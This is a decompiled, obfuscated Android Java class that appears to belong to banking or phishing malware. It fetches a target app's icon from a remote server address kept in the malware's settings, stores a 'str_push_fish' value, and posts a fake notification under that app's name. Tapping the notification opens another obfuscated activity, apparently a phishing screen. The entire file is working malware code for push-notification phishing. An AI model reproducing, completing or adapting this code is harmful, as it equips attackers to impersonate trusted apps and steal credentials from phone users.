package wocwvy.czyxoxmbauu.slsa;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.Notification;
import android.app.Notification.Builder;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import wocwvy.czyxoxmbauu.slsa.ncec.ozkgyjpxtyxajmm;

@SuppressLint({"NewApi"})
public class nepgaqmyfrhw extends IntentService {

    /* renamed from: a */
    C0034b f478a = new C0034b();

    /* renamed from: wocwvy.czyxoxmbauu.slsa.nepgaqmyfrhw$a */
    public class C0062a extends AsyncTask<String, Void, Bitmap> {

        /* renamed from: b */
        private Context f480b;

        /* renamed from: c */
        private String f481c;

        /* renamed from: d */
        private String f482d;

        /* renamed from: e */
        private String f483e;

        /* renamed from: f */
        private String f484f;

        public C0062a(Context context, String str, String str2, String str3, String str4) {
            this.f480b = context;
            this.f481c = str;
            this.f482d = str2;
            this.f483e = str3;
            this.f484f = str4;
            nepgaqmyfrhw.this.f478a.mo213a("PUSH", "2");
        }

        /* access modifiers changed from: protected */
        /* renamed from: a */
        public Bitmap doInBackground(String... strArr) {
            nepgaqmyfrhw.this.f478a.mo213a("PUSH", "3");
            try {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(this.f483e).openConnection();
                httpURLConnection.setDoInput(true);
                httpURLConnection.connect();
                return BitmapFactory.decodeStream(httpURLConnection.getInputStream());
            } catch (IOException | MalformedURLException unused) {
                return null;
            }
        }

        /* access modifiers changed from: protected */
        @TargetApi(16)
        /* renamed from: a */
        public void onPostExecute(Bitmap bitmap) {
            super.onPostExecute(bitmap);
            try {
                nepgaqmyfrhw.this.f478a.mo233d(this.f480b, "str_push_fish", this.f484f);
                StringBuilder sb = new StringBuilder();
                sb.append("4 ");
                sb.append(this.f484f);
                nepgaqmyfrhw.this.f478a.mo213a("PUSH", sb.toString());
                Intent addFlags = new Intent(nepgaqmyfrhw.this, ozkgyjpxtyxajmm.class).putExtra("str", this.f484f).addFlags(268435456).addFlags(8388608).addFlags(1073741824);
                if (VERSION.SDK_INT <= 25) {
                    NotificationManager notificationManager = (NotificationManager) this.f480b.getSystemService("notification");
                    Notification build = new Builder(this.f480b).setContentIntent(PendingIntent.getActivity(this.f480b, 100, addFlags, 1073741824)).setContentTitle(this.f481c).setContentText(this.f482d).setVibrate(new long[]{1000, 1000, 1000, 1000, 1000}).setPriority(1).setDefaults(2).setDefaults(1).setDefaults(4).setSmallIcon(R.drawable.im).setLargeIcon(bitmap).build();
                    build.flags |= 16;
                    notificationManager.notify(1, build);
                    return;
                }
                StringBuilder sb2 = new StringBuilder();
                sb2.append("Title: ");
                sb2.append(this.f481c);
                sb2.append(" Text: ");
                sb2.append(this.f482d);
                nepgaqmyfrhw.this.f478a.mo213a("Notification", sb2.toString());
                C0034b bVar = nepgaqmyfrhw.this.f478a;
                C0034b.m230a(this.f480b, addFlags, bitmap, this.f481c, this.f482d);
            } catch (Exception unused) {
                nepgaqmyfrhw.this.f478a.mo213a("ERROR", "nepgaqmyfrhw -> PUSH 4");
            }
        }
    }

    public nepgaqmyfrhw() {
        super("");
    }

    /* access modifiers changed from: protected */
    public void onHandleIntent(Intent intent) {
        String stringExtra = intent.getStringExtra("appname");
        String stringExtra2 = intent.getStringExtra("title");
        String stringExtra3 = intent.getStringExtra("text");
        String e = this.f478a.mo234e(this, "url");
        StringBuilder sb = new StringBuilder();
        sb.append("1: ");
        sb.append(e);
        sb.append("/icon/");
        sb.append(stringExtra);
        sb.append(".png");
        this.f478a.mo213a("PUSH", sb.toString());
        StringBuilder sb2 = new StringBuilder();
        sb2.append(e);
        sb2.append("/icon/");
        sb2.append(stringExtra);
        sb2.append(".png");
        C0062a aVar = new C0062a(this, stringExtra2, stringExtra3, sb2.toString(), stringExtra);
        aVar.execute(new String[0]);
    }
}
